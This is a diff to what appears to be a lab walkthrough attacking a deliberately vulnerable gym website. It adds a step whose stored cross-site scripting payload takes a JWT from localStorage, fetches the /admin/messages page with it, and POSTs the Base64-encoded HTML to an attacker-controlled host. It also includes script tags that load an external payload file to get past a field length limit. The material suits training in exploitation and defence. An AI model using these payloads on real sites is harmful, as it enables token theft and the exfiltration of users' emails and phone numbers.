@@ -449,7 +449,62 @@ Expected result after decoding the captured Base64:
 
 This demonstrates that the same front page request changes behavior once the attacker explicitly reuses the stolen JWT.
 
-## Step 19: move to the scripted collector later
+## Step 19: request `/admin/messages` with the JWT
+
+At this point the dashboard already shows that there is a `Ver mensajes` action pointing to `/admin/messages`.
+
+The inline reference version is:
+
+```html
+<script>
+const token = localStorage.getItem('gym_internal_token');
+fetch('/admin/messages', {
+  headers: {
+    Authorization: 'Bearer ' + token
+  }
+})
+  .then(r => r.text())
+  .then(html => {
+    const b64 = btoa(unescape(encodeURIComponent(html)));
+    fetch('http://attacker_machine_ip:9000/internal-html', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: b64
+    });
+  });
+</script>
+```
+
+That payload also exceeds the `250` character limit of the public `message` field, so this step should also be executed through an external JavaScript file.
+
+Serve:
+
+```text
+tools/payload-messages-with-jwt.js
+```
+
+and submit:
+
+```html
+<script src="http://attacker_machine_ip:8000/tools/payload-messages-with-jwt.js"></script>
+```
+
+Same-host variation:
+
+```html
+<script src="http://docker_host_gateway_ip:8000/tools/payload-messages-with-jwt.js"></script>
+```
+
+Expected result after decoding the captured Base64:
+
+- the returned HTML corresponds to `/admin/messages`
+- you can see the full message table
+- the table includes fields such as email and phone
+
+This demonstrates that the attacker can move from code execution to authenticated reading of the full contact dataset.
+
+## Step 20: move to the scripted collector later
 
 Once this manual capture is understood and demonstrated, you can switch to:
 
